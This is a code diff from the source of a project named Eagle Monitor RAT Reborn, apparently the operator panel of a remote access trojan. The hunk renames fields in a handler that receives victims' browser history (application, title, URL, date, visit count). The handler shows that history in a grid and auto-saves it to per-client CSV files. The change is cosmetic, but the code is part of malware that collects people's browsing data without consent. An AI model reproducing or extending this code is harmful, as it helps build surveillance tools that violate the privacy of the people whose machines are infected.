@@ -90,15 +90,15 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
             {
                 try
                 {
-                    if (ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView != null)
+                    if (ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientForm.historyDataGridView != null)
                     {
-                        ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.BeginInvoke((MethodInvoker)(() =>
+                        ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientForm.historyDataGridView.BeginInvoke((MethodInvoker)(() =>
                         {
-                            ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.Rows.Clear();
+                            ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientForm.historyDataGridView.Rows.Clear();
                             foreach (object[] str in historyPacket.historyList)
                             {
-                                int rowId = ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.Rows.Add();
-                                DataGridViewRow row = ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.Rows[rowId];
+                                int rowId = ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientForm.historyDataGridView.Rows.Add();
+                                DataGridViewRow row = ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientForm.historyDataGridView.Rows[rowId];
                                 row.Cells["Column5"].Value = str[0].ToString();
                                 row.Cells["Column6"].Value = str[1].ToString();
                                 row.Cells["Column7"].Value = str[2].ToString();
@@ -106,15 +106,15 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
                                 row.Cells["Column9"].Value = str[4].ToString();
                             }
                             if (Program.settings.autoSaveRecovery)
-                                Utils.ToCSV(ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView, ClientHandler.ClientHandlersList[historyPacket.baseIp].clientPath + "\\History\\" + Utils.DateFormater() + ".csv");
+                                Utils.ToCSV(ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientForm.historyDataGridView, ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientPath + "\\History\\" + Utils.DateFormater() + ".csv");
                             return;
                         }));
                     }
                     else
-                    { Utils.ToCSV(historyPacket.historyList, ClientHandler.ClientHandlersList[historyPacket.baseIp].clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
+                    { Utils.ToCSV(historyPacket.historyList, ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                 }
                 catch
-                { Utils.ToCSV(historyPacket.historyList, ClientHandler.ClientHandlersList[historyPacket.baseIp].clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
+                { Utils.ToCSV(historyPacket.historyList, ClientHandler.ClientHandlersList[historyPacket.BaseIp].ClientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
             }
             else
                 return;
